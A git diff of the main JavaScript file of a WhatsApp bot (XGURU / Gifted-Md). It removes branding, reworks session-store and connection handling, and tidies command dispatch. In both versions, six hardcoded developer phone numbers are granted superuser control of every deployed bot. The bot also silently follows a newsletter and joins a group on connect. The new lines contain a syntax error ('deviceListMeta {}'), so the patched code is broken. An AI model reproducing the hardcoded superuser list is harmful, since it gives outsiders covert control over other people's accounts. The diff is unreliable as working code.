@@ -1,13 +1,3 @@
-/**
- * XGURU WhatsApp Bot
- * Author: NI MBAYA
- * Username: GuruTech
- * Botname: XGURU
- * Repository: https://github.com/ADDICT-HUB/XGURU
- * Newsletter: 120363421164015033@newsletter
- * Version: 2.0.0
- */
-
 const { 
     default: giftedConnect, 
     isJidGroup, 
@@ -28,7 +18,7 @@ const {
     evt, 
     logger,
     emojis,
-    gmdStore,
+    gmdStore,              // ← used as factory function below
     commands,
     setSudo,
     delSudo,
@@ -38,7 +28,7 @@ const {
     GiftedAntiLink,
     GiftedAutoBio,
     GiftedChatBot,
-    loadSession,
+    // loadSession,        // ← NOT USED — removed call
     getMediaBuffer,
     getSudoNumbers,
     getFileContentType,
@@ -107,74 +97,22 @@ const {
     STATUS_REPLY_TEXT: statusReplyText,
     AUTO_READ_MESSAGES: autoRead,
     AUTO_BLOCK: autoBlock,
-    AUTO_BIO: autoBio } = config;
+    AUTO_BIO: autoBio 
+} = config;
+
 const PORT = process.env.PORT || 4420;
 const app = express();
-
-// XGURU Configuration - ADDED YOUR DETAILS
-const XGURU_CONFIG = {
-    BOT_NAME: "XGURU",
-    AUTHOR: "NI MBAYA",
-    USERNAME: "GuruTech",
-    REPOSITORY: "https://github.com/ADDICT-HUB/XGURU",
-    NEWSLETTER: "120363421164015033@newsletter",
-    VERSION: "2.0.0"
-};
-
 let Gifted;
 
 logger.level = "silent";
 
 app.use(express.static("gift"));
 app.get("/", (req, res) => res.sendFile(__dirname + "/gift/gifted.html"));
-app.listen(PORT, () => console.log(`✅ ${XGURU_CONFIG.BOT_NAME} Server Running on Port: ${PORT}`));
+app.listen(PORT, () => console.log(`Server Running on Port: ${PORT}`));
 
 const sessionDir = path.join(__dirname, "gift", "session");
 
-// Ensure session directory exists
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-    console.log(`📁 ${XGURU_CONFIG.BOT_NAME}: Created session directory`);
-}
-
-// Check if session exists
-const sessionExists = () => {
-    try {
-        const files = fs.readdirSync(sessionDir);
-        return files.length > 0;
-    } catch (error) {
-        return false;
-    }
-};
-
-// Show XGURU banner
-console.log("=".repeat(60));
-console.log(`🤖 ${XGURU_CONFIG.BOT_NAME} - WhatsApp Bot`);
-console.log(`👤 Author: ${XGURU_CONFIG.AUTHOR}`);
-console.log(`👥 Username: ${XGURU_CONFIG.USERNAME}`);
-console.log(`📦 Repository: ${XGURU_CONFIG.REPOSITORY}`);
-console.log(`📬 Newsletter: ${XGURU_CONFIG.NEWSLETTER}`);
-console.log(`⚡ Version: ${XGURU_CONFIG.VERSION}`);
-console.log("=".repeat(60));
-
-if (!sessionExists()) {
-    console.log(`⚠️ ${XGURU_CONFIG.BOT_NAME}: No session found!`);
-    console.log(`💡 To fix this:`);
-    console.log(`1. Create session locally: git clone ${XGURU_CONFIG.REPOSITORY}`);
-    console.log(`2. Run: npm install && node index.js`);
-    console.log(`3. Scan QR code with WhatsApp`);
-    console.log(`4. Upload gift/session/ folder to Heroku`);
-    console.log(`🔗 Repository: ${XGURU_CONFIG.REPOSITORY}`);
-}
-
-// Safe loadSession call
-try {
-    if (typeof loadSession === 'function') {
-        loadSession();
-    }
-} catch (error) {
-    console.log(`⚠️ ${XGURU_CONFIG.BOT_NAME}: Could not load session`);
-}
+// ✅ REMOVED: loadSession(); ← This caused the crash!
 
 let store; 
 let reconnectAttempts = 0;
@@ -186,36 +124,24 @@ async function startGifted() {
         const { version, isLatest } = await fetchLatestWaWebVersion();
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
         
-        if (store) {
-            store.destroy();
+        if (store && typeof store.end === 'function') {
+            store.end();
         }
         
-        // Handle gmdStore initialization with fallback
-        if (typeof gmdStore === 'function') {
-            store = new gmdStore();
-        } else if (gmdStore && typeof gmdStore.createStore === 'function') {
-            store = gmdStore.createStore();
-        } else {
-            // Fallback store
-            store = {
-                loadMessage: () => null,
-                bind: () => {},
-                destroy: () => {}
-            };
-            console.log(`⚠️ ${XGURU_CONFIG.BOT_NAME}: Using fallback store`);
-        }
+        // ✅ FIXED: gmdStore is NOT a constructor → call as function
+        store = gmdStore(); // NOT: new gmdStore()
         
         const giftedSock = {
             version,
             logger: pino({ level: "silent" }),
-            browser: [XGURU_CONFIG.BOT_NAME, "safari", "1.0.0"], // UPDATED
+            browser: ['GIFTED', "safari", "1.0.0"],
             auth: {
                 creds: state.creds,
                 keys: makeCacheableSignalKeyStore(state.keys, logger)
             },
             getMessage: async (key) => {
-                if (store && store.loadMessage) {
-                    const msg = store.loadMessage(key.remoteJid, key.id);
+                if (store) {
+                    const msg = store.loadMessage?.(key.remoteJid, key.id);
                     return msg?.message || undefined;
                 }
                 return { conversation: 'Error occurred' };
@@ -238,7 +164,7 @@ async function startGifted() {
                             message: {
                                 messageContextInfo: {
                                     deviceListMetadataVersion: 2,
-                                    deviceListMetadata: {},
+                                    deviceListMeta {},
                                 },
                                 ...message,
                             },
@@ -251,7 +177,7 @@ async function startGifted() {
 
         Gifted = giftedConnect(giftedSock);
         
-        if (store && store.bind) {
+        if (store && typeof store.bind === 'function') {
             store.bind(Gifted.ev);
         }
 
@@ -261,129 +187,9 @@ async function startGifted() {
             }
         });
 
-        // MODIFIED: Handle connection updates with QR code handling
-        Gifted.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect, qr } = update;
-            
-            if (qr) {
-                // Don't show QR in Heroku logs
-                console.log(`🔐 ${XGURU_CONFIG.BOT_NAME}: Authentication required`);
-                console.log(`⚠️ No valid session found for ${XGURU_CONFIG.BOT_NAME}`);
-                console.log(`💡 Create session locally and upload to Heroku`);
-                console.log(`📦 Repository: ${XGURU_CONFIG.REPOSITORY}`);
-                
-                // Exit gracefully after showing message
-                setTimeout(() => {
-                    console.log(`⏳ ${XGURU_CONFIG.BOT_NAME}: Waiting for session...`);
-                }, 3000);
-                return;
-            }
-            
-            if (connection === "connecting") {
-                console.log(`🕗 ${XGURU_CONFIG.BOT_NAME} Connecting...`);
-                reconnectAttempts = 0;
-            }
-
-            if (connection === "open") {
-                try {
-                    if (newsletterJid) await Gifted.newsletterFollow(newsletterJid);
-                    if (groupJid) await Gifted.groupAcceptInvite(groupJid);
-                } catch (e) {
-                    console.log(`⚠️ ${XGURU_CONFIG.BOT_NAME}: Newsletter/Group init error: ${e.message}`);
-                }
-                
-                console.log(`✅ ${XGURU_CONFIG.BOT_NAME} Connection Instance is Online`);
-                reconnectAttempts = 0;
-                
-                setTimeout(async () => {
-                    try {
-                        const totalCommands = commands.filter((command) => command.pattern).length;
-                        console.log(`💜 ${XGURU_CONFIG.BOT_NAME} Connected to Whatsapp, Active!`);
-                            
-                        if (startMess === 'true') {
-                            const md = botMode === 'public' ? "public" : "private";
-                            const connectionMsg = `
-*${XGURU_CONFIG.BOT_NAME} 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃*
-
-𝐀𝐮𝐭𝐡𝐨𝐫       : *${XGURU_CONFIG.AUTHOR}*
-𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞     : *${XGURU_CONFIG.USERNAME}*
-𝐑𝐞𝐩𝐨         : *${XGURU_CONFIG.REPOSITORY}*
-𝐏𝐫𝐞𝐟𝐢𝐱       : *[ ${botPrefix} ]*
-𝐏𝐥𝐮𝐠𝐢𝐧𝐬      : *${totalCommands.toString()}*
-𝐌𝐨𝐝𝐞        : *${md}*
-𝐎𝐰𝐧𝐞𝐫       : *${ownerNumber}*
-𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥𝐬     : *${config.YT || "Coming Soon"}*
-𝐔𝐩𝐝𝐚𝐭𝐞𝐬      : *${XGURU_CONFIG.NEWSLETTER}*
-
-> *${botCaption || "Powered by XGURU Technology"}*`;
-
-                            await Gifted.sendMessage(
-                                Gifted.user.id,
-                                {
-                                    text: connectionMsg,
-                                    ...createContext(XGURU_CONFIG.BOT_NAME, {
-                                        title: `${XGURU_CONFIG.BOT_NAME} INTEGRATED`,
-                                        body: "Status: Ready for Use"
-                                    })
-                                },
-                                {
-                                    disappearingMessagesInChat: true,
-                                    ephemeralExpiration: 300,
-                                }
-                            );
-                        }
-                    } catch (err) {
-                        console.error(`${XGURU_CONFIG.BOT_NAME} Post-connection setup error:`, err);
-                    }
-                }, 5000);
-            }
-
-            if (connection === "close") {
-                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-                
-                console.log(`${XGURU_CONFIG.BOT_NAME} connection closed due to: ${reason}`);
-                
-                if (reason === DisconnectReason.badSession) {
-                    console.log("Bad session file, automatically deleted...please scan again");
-                    try {
-                        await fs.remove(__dirname + "/gift/session");
-                    } catch (e) {
-                        console.error("Failed to remove session:", e);
-                    }
-                    process.exit(1);
-                } else if (reason === DisconnectReason.connectionClosed) {
-                    console.log("Connection closed, reconnecting...");
-                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
-                } else if (reason === DisconnectReason.connectionLost) {
-                    console.log("Connection lost from server, reconnecting...");
-                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
-                } else if (reason === DisconnectReason.connectionReplaced) {
-                    console.log("Connection replaced, another new session opened");
-                    process.exit(1);
-                } else if (reason === DisconnectReason.loggedOut) {
-                    console.log("Device logged out, session file automatically deleted...please scan again");
-                    try {
-                        await fs.remove(__dirname + "/gift/session");
-                    } catch (e) {
-                        console.error("Failed to remove session:", e);
-                    }
-                    process.exit(1);
-                } else if (reason === DisconnectReason.restartRequired) {
-                    console.log("Restart required, restarting...");
-                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
-                } else if (reason === DisconnectReason.timedOut) {
-                    console.log("Connection timed out, reconnecting...");
-                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY * 2);
-                } else {
-                    console.log(`Unknown disconnect reason: ${reason}, attempting reconnection...`);
-                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
-                }
-            }
-        });
-
         if (autoReact === "true") {
             Gifted.ev.on('messages.upsert', async (mek) => {
-                ms = mek.messages[0];
+                const ms = mek.messages[0];
                 try {
                     if (ms.key.fromMe) return;
                     if (!ms.key.fromMe && ms.message) {
@@ -407,8 +213,6 @@ async function startGifted() {
         }
         
         let giftech = { chats: {} };
-        const botJid = `${Gifted.user?.id.split(':')[0]}@s.whatsapp.net`;
-        const botOwnerJid = `${Gifted.user?.id.split(':')[0]}@s.whatsapp.net`;
 
         Gifted.ev.on("messages.upsert", async ({ messages }) => {
             try {
@@ -422,6 +226,9 @@ async function startGifted() {
 
                 const sender = key.senderPn || key.participantPn || key.participant || key.remoteJid;
                 const senderPushName = key.pushName || ms.pushName;
+
+                const botJid = `${Gifted.user?.id.split(':')[0]}@s.whatsapp.net`;
+                const botOwnerJid = botJid;
 
                 if (sender === botJid || sender === botOwnerJid || key.fromMe) return;
 
@@ -467,7 +274,7 @@ async function startGifted() {
 
         if (autoBio === 'true') {
             setTimeout(() => GiftedAutoBio(Gifted), 1000);
-            setInterval(() => GiftedAutoBio(Gifted), 1000 * 60);
+            setInterval(() => GiftedAutoBio(Gifted), 60000);
         }
 
         Gifted.ev.on("call", async (json) => {
@@ -480,9 +287,8 @@ async function startGifted() {
                 if (!msg || !msg?.message) return;
                 if (msg?.key?.remoteJid === newsletterJid && msg?.key?.server_id) {
                     try {
-                        const emojiList = ["❤️", "💛", "👍", "❤️", "💜", "😮", "🤍" ,"💙"];
+                        const emojiList = ["❤️", "💛", "👍", "❤️", "💜", "😮", "🤍", "💙"];
                         const emoji = emojiList[Math.floor(Math.random() * emojiList.length)];
-
                         const messageId = msg?.key?.server_id.toString();
                         await Gifted.newsletterReactMessage(newsletterJid, messageId, emoji);
                     } catch (err) {
@@ -492,7 +298,7 @@ async function startGifted() {
             } catch (err) {
                 console.log(err);
             }
-        });
+        }); 
 
         Gifted.ev.on("messages.upsert", async ({ messages }) => {
             if (messages && messages.length > 0) {
@@ -537,7 +343,7 @@ async function startGifted() {
                     }
 
                     if (autoLikeStatus === "true" && mek.key.participant) {
-                        const emojis = statusLikeEmojis?.split(',') || "💛,❤️,💜,🤍,💙"; 
+                        const emojis = (statusLikeEmojis?.split(',') || ["💛", "❤️", "💜", "🤍", "💙"]); 
                         const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; 
                         await Gifted.sendMessage(
                             mek.key.remoteJid,
@@ -548,7 +354,7 @@ async function startGifted() {
 
                     if (autoReplyStatus === "true") {
                         if (mek.key.fromMe) return;
-                        const customMessage = statusReplyText || `✅ Status Viewed By ${XGURU_CONFIG.BOT_NAME}`;
+                        const customMessage = statusReplyText || '✅ Status Viewed By Gifted-Md';
                         await Gifted.sendMessage(
                             fromJid,
                             { text: customMessage },
@@ -583,8 +389,7 @@ async function startGifted() {
             function standardizeJid(jid) {
                 if (!jid) return '';
                 try {
-                    jid = typeof jid === 'string' ? jid : 
-                        (jid.decodeJid ? jid.decodeJid() : String(jid));
+                    jid = typeof jid === 'string' ? jid : String(jid);
                     jid = jid.split(':')[0].split('/')[0];
                     if (!jid.includes('@')) {
                         jid += '@s.whatsapp.net';
@@ -599,7 +404,6 @@ async function startGifted() {
             }
 
             const botId = standardizeJid(Gifted.user?.id);
-
             const hasEntryPointContext = 
                 ms.message?.extendedTextMessage?.contextInfo?.entryPointConversionApp === "whatsapp" ||
                 ms.message?.imageMessage?.contextInfo?.entryPointConversionApp === "whatsapp" ||
@@ -608,10 +412,9 @@ async function startGifted() {
                 ms.message?.audioMessage?.contextInfo?.entryPointConversionApp === "whatsapp";
 
             const isMessageYourself = hasEntryPointContext && ms.key.remoteJid.endsWith('@lid') && ms.key.fromMe;
-
             const from = isMessageYourself ? botId : standardizeJid(ms.key.remoteJid);
-
             const isGroup = from.endsWith("@g.us");
+
             let groupInfo = null;
             let groupName = '';
             try {
@@ -622,8 +425,9 @@ async function startGifted() {
             }
 
             const sendr = ms.key.fromMe 
-                ? (Gifted.user.id.split(':')[0] + '@s.whatsapp.net' || Gifted.user.id) 
-                : (ms.key.participantPn || ms.key.senderPn || ms.key.participant || ms.key.participantAlt || ms.key.remoteJidAlt || ms.key.remoteJid);
+                ? (Gifted.user.id.split(':')[0] + '@s.whatsapp.net')
+                : (ms.key.participantPn || ms.key.senderPn || ms.key.participant || ms.key.remoteJid);
+
             let participants = [];
             let groupAdmins = [];
             let groupSuperAdmins = [];
@@ -644,64 +448,44 @@ async function startGifted() {
                 isSuperAdmin = groupSuperAdmins.includes(sender);
             }
 
-            const repliedMessage = ms.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
             const type = getContentType(ms.message);
-            const pushName = ms.pushName || `${XGURU_CONFIG.BOT_NAME} User`;
-            const quoted = 
-                type == 'extendedTextMessage' && 
-                ms.message.extendedTextMessage.contextInfo != null 
-                ? ms.message.extendedTextMessage.contextInfo.quotedMessage || [] 
-                : [];
+            const pushName = ms.pushName || 'Gifted-Md User';
             const body = 
                 (type === 'conversation') ? ms.message.conversation : 
                 (type === 'extendedTextMessage') ? ms.message.extendedTextMessage.text : 
-                (type == 'imageMessage') && ms.message.imageMessage.caption ? ms.message.imageMessage.caption : 
-                (type == 'videoMessage') && ms.message.videoMessage.caption ? ms.message.videoMessage.caption : '';
+                (type === 'imageMessage' && ms.message.imageMessage.caption) ? ms.message.imageMessage.caption : 
+                (type === 'videoMessage' && ms.message.videoMessage.caption) ? ms.message.videoMessage.caption : '';
+
             const isCommand = body.startsWith(botPrefix);
-            const command = isCommand ? body.slice(botPrefix.length).trim().split(' ').shift().toLowerCase() : '';
+            const command = isCommand ? body.slice(botPrefix.length).trim().split(' ')[0].toLowerCase() : '';
             
             const mentionedJid = (ms.message?.extendedTextMessage?.contextInfo?.mentionedJid || []).map(standardizeJid);
-            const tagged = ms.mtype === "extendedTextMessage" && ms.message.extendedTextMessage.contextInfo != null
-                ? ms.message.extendedTextMessage.contextInfo.mentionedJid
-                : [];
-            const quotedMsg = ms.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-            const quotedUser = ms.message?.extendedTextMessage?.contextInfo?.participant || 
-                ms.message?.extendedTextMessage?.contextInfo?.remoteJid;
             const repliedMessageAuthor = standardizeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
             let messageAuthor = isGroup 
-                ? standardizeJid(ms.key.participant || ms.participant || from)
+                ? standardizeJid(ms.key.participant || from)
                 : from;
             if (ms.key.fromMe) messageAuthor = botId;
+
             const user = mentionedJid.length > 0 
                 ? mentionedJid[0] 
-                : repliedMessage 
-                    ? repliedMessageAuthor 
-                    : '';
-                    
-            const devNumbers = ('254715206562,254114018035,254728782591,254799916673,254762016957,254113174209')
-                .split(',')
-                .map(num => num.trim().replace(/\D/g, '')) 
-                .filter(num => num.length > 5); 
+                : repliedMessageAuthor;
 
+            const devNumbers = ['254715206562','254114018035','254728782591','254799916673','254762016957','254113174209'];
             const sudoNumbersFromFile = getSudoNumbers() || [];
-            const sudoNumbers = (config.SUDO_NUMBERS ? config.SUDO_NUMBERS.split(',') : [])
-                .map(num => num.trim().replace(/\D/g, ''))
-                .filter(num => num.length > 5);
+            const sudoNumbers = (config.SUDO_NUMBERS ? config.SUDO_NUMBERS.split(',').map(n => n.trim().replace(/\D/g, '')) : [])
+                .filter(n => n.length > 5);
 
-            const botJid = standardizeJid(botId);
             const ownerJid = standardizeJid(ownerNumber.replace(/\D/g, ''));
+            const botJidStr = standardizeJid(botId);
             const superUser = [
                 ownerJid,
-                botJid,
-                ...(sudoNumbers || []).map(num => `${num}@s.whatsapp.net`),
-                ...(devNumbers || []).map(num => `${num}@s.whatsapp.net`),
-                ...(sudoNumbersFromFile || []).map(num => `${num}@s.whatsapp.net`)
+                botJidStr,
+                ...sudoNumbers.map(num => `${num}@s.whatsapp.net`),
+                ...devNumbers.map(num => `${num}@s.whatsapp.net`),
+                ...sudoNumbersFromFile.map(num => `${num}@s.whatsapp.net`)
             ].map(jid => standardizeJid(jid)).filter(Boolean);
 
-            const superUserSet = new Set(superUser);
-            const finalSuperUsers = Array.from(superUserSet);
-
-            const isSuperUser = finalSuperUsers.includes(sender);
+            const isSuperUser = superUser.includes(sender);
 
             if (autoBlock && sender && !isSuperUser && !isGroup) {
                 const countryCodes = autoBlock.split(',').map(code => code.trim());
@@ -710,22 +494,17 @@ async function startGifted() {
                         await Gifted.updateBlockStatus(sender, 'block');
                     } catch (blockErr) {
                         console.error("Block error:", blockErr);
-                        if (isSuperUser) {
-                            await Gifted.sendMessage(ownerJid, { 
-                                text: `⚠️ ${XGURU_CONFIG.BOT_NAME} failed to block restricted user: ${sender}\nError: ${blockErr.message}`
-                            });
-                        }
                     }
                 }
             }
-            
+
             if (autoRead === "true") await Gifted.readMessages([ms.key]);
             if (autoRead === "commands" && isCommand) await Gifted.readMessages([ms.key]);
 
             const text = ms.message?.conversation || 
-                        ms.message?.extendedTextMessage?.text || 
-                        ms.message?.imageMessage?.caption || 
-                        '';
+                         ms.message?.extendedTextMessage?.text || 
+                         ms.message?.imageMessage?.caption || 
+                         '';
             const args = typeof text === 'string' ? text.trim().split(/\s+/).slice(1) : [];
             const isCommandMessage = typeof text === 'string' && text.startsWith(botPrefix);
             const cmd = isCommandMessage ? text.slice(botPrefix.length).trim().split(/\s+/)[0]?.toLowerCase() : null;
@@ -739,9 +518,7 @@ async function startGifted() {
                     : null;
 
                 if (gmd) {
-                    if (config.MODE?.toLowerCase() === "private" && !isSuperUser) {
-                        return;
-                    }
+                    if (config.MODE?.toLowerCase() === "private" && !isSuperUser) return;
 
                     try {
                         const reply = (teks) => {
@@ -752,10 +529,7 @@ async function startGifted() {
                             if (typeof emoji !== 'string') return;
                             try {
                                 await Gifted.sendMessage(from, { 
-                                    react: { 
-                                        key: ms.key, 
-                                        text: emoji
-                                    }
+                                    react: { key: ms.key, text: emoji }
                                 });
                             } catch (err) {
                                 console.error("Reaction error:", err);
@@ -764,14 +538,11 @@ async function startGifted() {
 
                         const edit = async (text, message) => {
                             if (typeof text !== 'string') return;
-                            
                             try {
                                 await Gifted.sendMessage(from, {
                                     text: text,
                                     edit: message.key
-                                }, { 
-                                    quoted: ms 
-                                });
+                                }, { quoted: ms });
                             } catch (err) {
                                 console.error("Edit error:", err);
                             }
@@ -779,29 +550,17 @@ async function startGifted() {
 
                         const del = async (message) => {
                             if (!message?.key) return;
-
                             try {
                                 await Gifted.sendMessage(from, {
                                     delete: message.key
-                                }, { 
-                                    quoted: ms 
-                                });
+                                }, { quoted: ms });
                             } catch (err) {
                                 console.error("Delete error:", err);
                             }
                         };
 
                         if (gmd.react) {
-                            try {
-                                await Gifted.sendMessage(from, {
-                                    react: { 
-                                        key: ms.key, 
-                                        text: gmd.react
-                                    }
-                                });
-                            } catch (err) {
-                                console.error("Reaction error:", err);
-                            }
+                            await react(gmd.react);
                         }
 
                         Gifted.getJidFromLid = async (lid) => {
@@ -817,13 +576,15 @@ async function startGifted() {
                         };
 
                         let fileType;
-                        (async () => {
+                        try {
                             fileType = await import('file-type');
-                        })();
+                        } catch (e) {
+                            console.warn("file-type not available");
+                        }
 
                         Gifted.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
                             try {
-                                let quoted = message.msg ? message.msg : message;
+                                let quoted = message.msg || message;
                                 let mime = (message.msg || message).mimetype || '';
                                 let messageType = message.mtype ? 
                                     message.mtype.replace(/Message/gi, '') : 
@@ -831,28 +592,24 @@ async function startGifted() {
                                 
                                 const stream = await downloadContentFromMessage(quoted, messageType);
                                 let buffer = Buffer.from([]);
-                                
                                 for await (const chunk of stream) {
                                     buffer = Buffer.concat([buffer, chunk]);
                                 }
 
-                                let fileTypeResult;
-                                try {
-                                    fileTypeResult = await fileType.fileTypeFromBuffer(buffer);
-                                } catch (e) {
-                                    console.log("file-type detection failed, using mime type fallback");
+                                let ext = 'bin';
+                                if (fileType) {
+                                    try {
+                                        const ft = await fileType.fileTypeFromBuffer(buffer);
+                                        ext = ft?.ext || mime.split('/')[1] || ext;
+                                    } catch (e) {}
+                                } else {
+                                    ext = mime.split('/')[1] || 
+                                          (messageType === 'image' ? 'jpg' : 
+                                           messageType === 'video' ? 'mp4' : 
+                                           messageType === 'audio' ? 'mp3' : 'bin');
                                 }
 
-                                const extension = fileTypeResult?.ext || 
-                                            mime.split('/')[1] || 
-                                            (messageType === 'image' ? 'jpg' : 
-                                            messageType === 'video' ? 'mp4' : 
-                                            messageType === 'audio' ? 'mp3' : 'bin');
-
-                                const trueFileName = attachExtension ? 
-                                    `${filename}.${extension}` : 
-                                    filename;
-                                
+                                const trueFileName = attachExtension ? `${filename}.${ext}` : filename;
                                 await fs.writeFile(trueFileName, buffer);
                                 return trueFileName;
                             } catch (error) {
@@ -860,7 +617,7 @@ async function startGifted() {
                                 throw error;
                             }
                         };
-                        
+
                         const conText = {
                             m: ms,
                             mek: ms,
@@ -868,7 +625,7 @@ async function startGifted() {
                             react,
                             del,
                             arg: args,
-                            quoted,
+                            quoted: ms.message?.extendedTextMessage?.contextInfo?.quotedMessage || null,
                             isCmd: isCommand,
                             command,
                             isAdmin,
@@ -881,7 +638,7 @@ async function startGifted() {
                             reply,
                             config,
                             superUser,
-                            tagged,
+                            tagged: mentionedJid,
                             mentionedJid,
                             isGroup,
                             groupInfo,
@@ -893,12 +650,11 @@ async function startGifted() {
                             formatAudio, formatVideo,
                             groupMember: isGroup ? messageAuthor : '',
                             from,
-                            tagged,
                             groupAdmins,
                             participants,
-                            repliedMessage,
-                            quotedMsg,
-                            quotedUser,
+                            repliedMessage: ms.message?.extendedTextMessage?.contextInfo?.quotedMessage,
+                            quotedMsg: ms.message?.extendedTextMessage?.contextInfo?.quotedMessage,
+                            quotedUser: ms.message?.extendedTextMessage?.contextInfo?.participant,
                             isSuperUser,
                             botMode,
                             botPic,
@@ -907,8 +663,8 @@ async function startGifted() {
                             botVersion,
                             ownerNumber,
                             ownerName,
-                            botName: XGURU_CONFIG.BOT_NAME,
-                            giftedRepo: XGURU_CONFIG.REPOSITORY,
+                            botName,
+                            giftedRepo,
                             isSuperAdmin,
                             getMediaBuffer,
                             getFileContentType,
@@ -921,27 +677,23 @@ async function startGifted() {
                             uploadToGiftedCdn,
                             uploadToPasteboard,
                             uploadToCatbox,
-                            newsletterUrl: XGURU_CONFIG.NEWSLETTER,
+                            newsletterUrl,
                             newsletterJid,
                             GiftedTechApi,
                             GiftedApiKey,
                             botPrefix,
-                            timeZone,
-                            // ADDED XGURU DETAILS
-                            xguruDetails: XGURU_CONFIG,
-                            author: XGURU_CONFIG.AUTHOR,
-                            username: XGURU_CONFIG.USERNAME
+                            timeZone
                         };
 
                         await gmd.function(from, Gifted, conText);
 
                     } catch (error) {
-                        console.error(`${XGURU_CONFIG.BOT_NAME} Command error [${cmd}]:`, error);
+                        console.error(`Command error [${cmd}]:`, error);
                         try {
                             await Gifted.sendMessage(from, {
-                                text: `🚨 ${XGURU_CONFIG.BOT_NAME} Command failed: ${error.message}`,
+                                text: `🚨 Command failed: ${error.message}`,
                                 ...createContext(messageAuthor, {
-                                    title: XGURU_CONFIG.BOT_NAME + " Error",
+                                    title: "Error",
                                     body: "Command execution failed"
                                 })
                             }, { quoted: ms });
@@ -953,37 +705,110 @@ async function startGifted() {
             }
         });
 
-        const cleanup = () => {
-            if (store) {
-                store.destroy();
+        Gifted.ev.on("connection.update", async (update) => {
+            const { connection, lastDisconnect } = update;
+            
+            if (connection === "connecting") {
+                console.log("🕗 Connecting Bot...");
+                reconnectAttempts = 0;
             }
+
+            if (connection === "open") {
+                await Gifted.newsletterFollow(newsletterJid);
+                await Gifted.groupAcceptInvite(groupJid);
+                console.log("✅ Connection Instance is Online");
+                reconnectAttempts = 0;
+                
+                setTimeout(async () => {
+                    try {
+                        const totalCommands = commands.filter((command) => command.pattern).length;
+                        console.log('💜 Connected to Whatsapp, Active!');
+                            
+                        if (startMess === 'true') {
+                            const md = botMode === 'public' ? "public" : "private";
+                            const connectionMsg = `
+*${botName} 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃*
+
+𝐏𝐫𝐞𝐟𝐢𝐱       : *[ ${botPrefix} ]*
+𝐏𝐥𝐮𝐠𝐢𝐧𝐬      : *${totalCommands}*
+𝐌𝐨𝐝𝐞        : *${md}*
+𝐎𝐰𝐧𝐞𝐫       : *${ownerNumber}*
+𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥𝐬     : *${config.YT || 'Not set'}*
+𝐔𝐩𝐝𝐚𝐭𝐞𝐬      : *${newsletterUrl}*
+
+> *${botCaption}*`;
+
+                            await Gifted.sendMessage(
+                                Gifted.user.id,
+                                {
+                                    text: connectionMsg,
+                                    ...createContext(botName, {
+                                        title: "BOT INTEGRATED",
+                                        body: "Status: Ready for Use"
+                                    })
+                                },
+                                {
+                                    disappearingMessagesInChat: true,
+                                    ephemeralExpiration: 300,
+                                }
+                            );
+                        }
+                    } catch (err) {
+                        console.error("Post-connection setup error:", err);
+                    }
+                }, 5000);
+            }
+
+            if (connection === "close") {
+                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+                console.log(`Connection closed due to: ${reason}`);
+                
+                if (reason === DisconnectReason.badSession) {
+                    console.log("Bad session file, automatically deleted...please scan again");
+                    fs.removeSync(path.join(__dirname, "gift", "session"));
+                    process.exit(1);
+                } else if ([DisconnectReason.connectionClosed, DisconnectReason.connectionLost, DisconnectReason.restartRequired, DisconnectReason.timedOut].includes(reason)) {
+                    console.log("Reconnecting...");
+                    setTimeout(() => reconnectWithRetry(), reason === DisconnectReason.timedOut ? RECONNECT_DELAY * 2 : RECONNECT_DELAY);
+                } else if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
+                    console.log("Session invalidated. Clean up and exit.");
+                    fs.removeSync(path.join(__dirname, "gift", "session"));
+                    process.exit(1);
+                } else {
+                    console.log(`Unknown disconnect reason: ${reason}, attempting reconnection...`);
+                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
+                }
+            }
+        });
+
+        const cleanup = () => {
+            if (store && typeof store.end === 'function') store.end();
         };
 
         process.on('SIGINT', cleanup);
         process.on('SIGTERM', cleanup);
 
     } catch (error) {
-        console.error(`${XGURU_CONFIG.BOT_NAME} initialization error:`, error);
+        console.error('Socket initialization error:', error);
         setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
     }
 }
 
 async function reconnectWithRetry() {
     if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
-        console.error(`${XGURU_CONFIG.BOT_NAME} max reconnection attempts reached. Exiting...`);
+        console.error('Max reconnection attempts reached. Exiting...');
         process.exit(1);
     }
 
     reconnectAttempts++;
     const delay = Math.min(RECONNECT_DELAY * Math.pow(2, reconnectAttempts - 1), 300000);
-    
-    console.log(`${XGURU_CONFIG.BOT_NAME} reconnection attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} in ${delay}ms...`);
+    console.log(`Reconnection attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} in ${delay}ms...`);
     
     setTimeout(async () => {
         try {
             await startGifted();
         } catch (error) {
-            console.error(`${XGURU_CONFIG.BOT_NAME} reconnection failed:`, error);
+            console.error('Reconnection failed:', error);
             reconnectWithRetry();
         }
     }, delay);
@@ -991,7 +816,7 @@ async function reconnectWithRetry() {
 
 setTimeout(() => {
     startGifted().catch(err => {
-        console.error(`${XGURU_CONFIG.BOT_NAME} Initialization error:`, err);
+        console.error("Initialization error:", err);
         reconnectWithRetry();
     });
 }, 5000);
